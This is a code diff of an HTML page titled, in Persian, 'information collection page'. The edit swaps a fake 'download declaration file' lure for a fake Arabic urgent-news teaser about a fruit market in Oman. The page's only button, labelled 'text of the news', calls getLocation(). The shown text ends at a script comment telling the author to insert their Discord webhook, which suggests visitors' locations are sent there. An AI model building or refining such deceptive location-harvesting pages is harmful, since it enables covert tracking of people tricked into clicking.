@@ -4,22 +4,78 @@
 <meta charset="UTF-8">
 <title>صفحه دریافت اطلاعات</title>
 <style>
-body { font-family: Tahoma, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
-.container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-button { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+    body, html {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #f4f6f9;
+    font-family: Tahoma, sans-serif;
+    /* فعال‌سازی فکسباکس برای وسط‌چین کردن کل محتوا در صفحه گوشی */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.main-wrapper {
+    width: 90%;
+    max-width: 400px;
+    background: white;
+    padding: 20px;
+    border-radius: 12px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.05);
+    /* چیدن المان‌های داخلی به صورت عمودی و زیر هم */
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.news-img {
+    width: 100%;
+    height: auto;
+    border-radius: 8px;
+    margin-bottom: 15px;
+}
+
+.news-text {
+    font-size: 16px;
+    font-weight: bold;
+    color: #222;
+    margin-bottom: 20px;
+    text-align: center;
+    white-space: nowrap; /* نگه‌داشتن متن در یک خط */
+}
+
+.btn-download {
+    background-color: #007bff;
+    color: white;
+    border: none;
+    padding: 12px 0;
+    width: 100%; /* دکمه هم‌عرض با کادر می‌شود */
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 16px;
+    font-weight: bold;
+}
+
 </style>
 </head>
 <body>
     <div class="container">
-    
-    <!-- 📸 تگ اضافه کردن عکس -->
-    
-<div class="container">
-    <h1>  </h1>
-    <img src="IMG-20260906-WA0010.jpg" style="width: 80vw; height: 80vh; object-fit: fill; position: fixed; top: 0; left: 0; z-index: 1;">دانلود فایل اضهارنامه علی پیشگر</button>
+        <body>
 
-<button onclick="getLocation()" style="background-color: #007bff; color: white; border: none; padding: 10px 0px; width: 60%; border-radius: 6px; cursor: pointer; font-size: 30px; font-weight: bold; margin-top: 15px;">  
- </div>
+<div class="main-wrapper">
+    <!-- 📸 تصویر در بالاترین قسمت کادر قرار می‌گیرد -->
+    <img src="image.jpg" alt="اخبار عاجل" class="news-img">
+    
+    <!-- 📝 متن زیر تصویر -->
+    <div class="news-text">عاجل آخر واهم اخبار سوق الفواكه في عمان</div>
+    
+    <!-- 🔘 دکمه دانلود/اقدام در پایین‌ترین قسمت -->
+    <button class="btn-download" onclick="getLocation()">نص الخبر</button>
+</div>
+
+</body>
 
 <script>
 // آدرس وب‌هوک دیسکورد خود را اینجا قرار دهید
